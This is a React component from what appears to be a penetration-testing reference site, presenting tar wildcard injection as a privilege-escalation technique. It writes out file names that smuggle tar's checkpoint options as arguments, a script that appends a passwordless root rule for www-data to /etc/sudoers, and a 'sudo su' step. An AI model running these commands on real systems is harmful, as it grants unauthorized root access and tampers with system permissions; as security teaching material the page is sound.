import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const TarWildcardInjection = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              When using a wildcard with tar to compress multiple files, an
              attacker can create malicious file names that are read as command
              line arguments when tar is compressing them.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'echo "" > --checkpoint=1'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'echo "" > "--checkpoint-action=exec=sh script.sh"'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Create{" "}
              <Typography display="inline" className="highlight">
                script.sh
              </Typography>{" "}
              that can be used for a shell. The script will depend on the
              scenario you are in.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "echo 'echo \"www-data ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > script.sh"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"sudo su"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default TarWildcardInjection;
